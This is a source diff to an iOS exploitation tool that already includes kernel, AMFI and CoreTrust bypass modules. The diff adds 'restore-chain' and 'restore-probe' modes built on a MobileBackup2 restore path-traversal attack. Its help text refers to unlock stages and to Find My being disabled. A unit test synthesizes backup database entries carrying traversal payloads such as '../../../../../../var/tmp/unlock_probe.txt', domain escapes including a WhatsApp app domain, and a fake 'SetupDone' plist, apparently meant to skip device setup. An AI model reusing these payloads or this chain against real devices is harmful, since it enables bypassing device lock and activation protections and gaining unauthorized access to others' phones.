@@ -9,6 +9,7 @@
 #include "exploits/kernel_exploit.h"
 #include "exploits/bypass_chain.h"
 #include "exploits/preboard_race.h"
+#include "backup/mb2_restore.h"
 #include "exploits/amfi_bypass.h"
 #include "exploits/coretrust_bypass.h"
 #include "exploits/kernel_offsets.h"
@@ -76,8 +77,11 @@ static void print_help(const char *prog_name)
     printf("      --appleave2-deploy       Stage AppleAVE2 payload & AFC directory to device\n");
     printf("      --appleave2-status       Pull and display live on-device AppleAVE2 telemetry\n");
     printf("      --pull-appleave2-result  Alias for --appleave2-status\n");
-    printf("      --test-lockdown-bypass   Test unauthenticated lockdown SSL bypass & traversal\n");
-    printf("      --setup-assistant-chain  Setup-safe path: Soft AP → captive WebSheet JS foothold\n");
+     printf("      --test-lockdown-bypass   Test unauthenticated lockdown SSL bypass & traversal\n");
+     printf("      --restore-chain          Execute Restore-Chain (MobileBackup2 restore-staging path traversal)\n");
+     printf("                             NOTE: Find My must be disabled on device; manual operator step + 211 retry\n");
+     printf("      --restore-probe          Restore-Chain probe: protocol validation only (no unlock stages)\n");
+     printf("      --setup-assistant-chain  Setup-safe path: Soft AP → captive WebSheet JS foothold\n");
     printf("                             (no sideload; stops at JS confirm — no fake kRW/activation)\n");
     printf("      --glyphgrift-chain       GlyphGrift V2: spray → multi-PDF OOB → captive_krw → AMFI/SEP\n");
     printf("                             (auto stages 5–8 after OOB path; no fake kRW/activation)\n");
@@ -1118,6 +1122,103 @@ static int run_unit_tests(void)
         }
     }
 
+    /* Test 22: Restore-Chain manifest/mbdb synthesizers (host-only, no device).
+       Round-trip: write an mbdb with traversal entries (dot-dot paths and a
+       domain-escape), parse it back, assert the structure survived intact.
+       Also validate the Manifest.plist schema (Version 8.0 / SystemDomainsVersion 19.0). */
+    total++;
+    printf("Test 22: Restore-Chain Manifest/MBDB Synthesizer & Traversal Round-Trip... ");
+    {
+        /* 1. Manifest.plist synthesizer: must be a valid binary plist with the
+           exact passing schema observed on 26.6.1. */
+        uint8_t *mplist = NULL;
+        size_t mplist_len = 0;
+        bool manifest_ok = (mb2_synthesize_manifest_plist(&mplist, &mplist_len) == 0 &&
+                            mplist != NULL && mplist_len > 0 &&
+                            memcmp(mplist, "bplist00", 8) == 0);
+        if (manifest_ok) {
+            plist_t mnode = NULL;
+            plist_format_t mfmt = PLIST_FORMAT_NONE;
+            if (plist_from_memory((const char *)mplist, (uint32_t)mplist_len, &mnode, &mfmt) == PLIST_ERR_SUCCESS &&
+                mnode && mfmt == PLIST_FORMAT_BINARY && plist_get_node_type(mnode) == PLIST_DICT) {
+                char *ver = NULL;
+                char *sdv = NULL;
+                plist_t vn = plist_dict_get_item(mnode, "Version");
+                plist_t sn = plist_dict_get_item(mnode, "SystemDomainsVersion");
+                if (vn && plist_get_node_type(vn) == PLIST_STRING) plist_get_string_val(vn, &ver);
+                if (sn && plist_get_node_type(sn) == PLIST_STRING) plist_get_string_val(sn, &sdv);
+                manifest_ok = ver && sdv &&
+                              strcmp(ver, MB2_MANIFEST_VERSION) == 0 &&
+                              strcmp(sdv, MB2_SYS_DOMAINS_VERSION) == 0;
+                free(ver);
+                free(sdv);
+                plist_free(mnode);
+            } else {
+                manifest_ok = false;
+            }
+        }
+        free(mplist);
+
+        /* 2. mbdb writer/reader round-trip with traversal entries. */
+        mb2_staged_file_t in[3];
+        memset(in, 0, sizeof(in));
+        mb2_canary_content(in[0].content, sizeof(in[0].content), "trav1");
+        in[0].len = (uint32_t)strlen(in[0].content);
+        snprintf(in[0].domain, sizeof(in[0].domain), "SysContainerDomain-../../..");
+        snprintf(in[0].path, sizeof(in[0].path), "Media/trav1_l0fck.txt");
+
+        mb2_canary_content(in[1].content, sizeof(in[1].content), "trav2");
+        in[1].len = (uint32_t)strlen(in[1].content);
+        snprintf(in[1].domain, sizeof(in[1].domain), "SysContainerDomain-../../../../../../");
+        snprintf(in[1].path, sizeof(in[1].path), "var/tmp/trav2_l0fck.txt");
+
+        const char *fake_plist = "<plist version=\"1.0\"><dict><key>SetupDone</key><true/></dict></plist>";
+        snprintf(in[2].content, sizeof(in[2].content), "%s", fake_plist);
+        in[2].len = (uint32_t)strlen(fake_plist);
+        snprintf(in[2].domain, sizeof(in[2].domain), "AppDomain-net.whatsapp.WhatsApp-../../..");
+        snprintf(in[2].path, sizeof(in[2].path), "../../../../../../var/tmp/unlock_probe.txt");
+
+        uint8_t *mbdb = NULL;
+        size_t mbdb_len = 0;
+        bool mbdb_ok = (mb2_synthesize_mbdb(in, 3, &mbdb, &mbdb_len) == 0 && mbdb != NULL && mbdb_len > 16);
+
+        mb2_staged_file_t *parsed = NULL;
+        size_t parsed_count = 0;
+        bool rt_ok = false;
+        if (mbdb_ok) {
+            rt_ok = (mb2_parse_mbdb(mbdb, mbdb_len, &parsed, &parsed_count) == 0 &&
+                     parsed != NULL && parsed_count == 3 &&
+                     strcmp(parsed[0].domain, in[0].domain) == 0 &&
+                     strcmp(parsed[0].path, in[0].path) == 0 &&
+                     parsed[0].len == in[0].len &&
+                     strcmp(parsed[1].domain, in[1].domain) == 0 &&
+                     strcmp(parsed[1].path, in[1].path) == 0 &&
+                     parsed[1].len == in[1].len &&
+                     strcmp(parsed[2].domain, in[2].domain) == 0 &&
+                     strcmp(parsed[2].path, in[2].path) == 0 &&
+                     parsed[2].len == in[2].len &&
+                     /* traversal markers must survive verbatim */
+                     strstr(parsed[0].domain, "../") != NULL &&
+                     strstr(parsed[1].domain, "../../../") != NULL &&
+                     strstr(parsed[2].path, "../") != NULL);
+        }
+
+        /* 3. Negative: garbage must be rejected, not mis-parsed. */
+        bool reject_ok = (mb2_parse_mbdb((const uint8_t *)"not-mbdb-xxxxx-xxxx", 20, NULL, NULL) != 0);
+
+        if (parsed) mb2_free_mbdb_entries(parsed);
+        free(mbdb);
+
+        if (manifest_ok && mbdb_ok && rt_ok && reject_ok) {
+            printf(ANSI_COLOR_GREEN "[PASS]" ANSI_COLOR_RESET "\n");
+            passed++;
+        } else {
+            printf(ANSI_COLOR_RED "[FAIL]" ANSI_COLOR_RESET
+                   " (manifest=%d mbdb=%d roundtrip=%d reject=%d)\n",
+                   manifest_ok, mbdb_ok, rt_ok, reject_ok);
+        }
+    }
+
     printf("\nSelf-Test Result: %d/%d tests passed cleanly.\n", passed, total);
     printf(ANSI_COLOR_CYAN "========================================================================" ANSI_COLOR_RESET "\n\n");
 
@@ -1254,6 +1355,8 @@ int main(int argc, char **argv)
     int opt_appleave2_deploy = 0;
     int opt_pull_appleave2_result = 0;
     int opt_test_lockdown_bypass = 0;
+    int opt_restore_chain = 0;
+    int opt_restore_probe = 0;
     int opt_verbose = 0;
 
     const char *v047_ondevice_mode = NULL;
@@ -1332,7 +1435,9 @@ int main(int argc, char **argv)
         OPT_APPLEAVE2_DEPLOY,
         OPT_APPLEAVE2_STATUS,
         OPT_PULL_APPLEAVE2_RESULT,
-        OPT_TEST_LOCKDOWN_BYPASS
+        OPT_TEST_LOCKDOWN_BYPASS,
+        OPT_RESTORE_CHAIN,
+        OPT_RESTORE_PROBE
     };
 
     static struct option long_options[] = {
@@ -1390,6 +1495,8 @@ int main(int argc, char **argv)
         { "appleave2-status",      no_argument,     NULL, OPT_APPLEAVE2_STATUS },
         { "pull-appleave2-result", no_argument,     NULL, OPT_PULL_APPLEAVE2_RESULT },
         { "test-lockdown-bypass",  no_argument,     NULL, OPT_TEST_LOCKDOWN_BYPASS },
+        { "restore-chain",         no_argument,     NULL, OPT_RESTORE_CHAIN },
+        { "restore-probe",         no_argument,     NULL, OPT_RESTORE_PROBE },
         { "verbose",          no_argument,       NULL, 'v' },
         { "help",             no_argument,       NULL, 'h' },
         { NULL, 0, NULL, 0 }
@@ -1503,6 +1610,8 @@ int main(int argc, char **argv)
             case OPT_APPLEAVE2_STATUS:
             case OPT_PULL_APPLEAVE2_RESULT: opt_pull_appleave2_result = 1; break;
             case OPT_TEST_LOCKDOWN_BYPASS: opt_test_lockdown_bypass = 1; break;
+            case OPT_RESTORE_CHAIN: opt_restore_chain = 1; break;
+            case OPT_RESTORE_PROBE: opt_restore_probe = 1; break;
             default:
                 print_help(argv[0]);
                 return 1;
@@ -1781,6 +1890,10 @@ int main(int argc, char **argv)
         ret = pmap_chain_run(&sess, NULL);
     } else if (opt_test_lockdown_bypass) {
         ret = lockdown_bypass_test(sess.ld);
+    } else if (opt_restore_chain) {
+        ret = restore_chain_run(&sess, NULL);
+    } else if (opt_restore_probe) {
+        ret = restore_chain_probe(&sess, NULL);
     } else if (opt_appleave2_deploy) {
         ret = appleave2_payload_deploy(&sess);
     } else if (opt_pull_appleave2_result) {
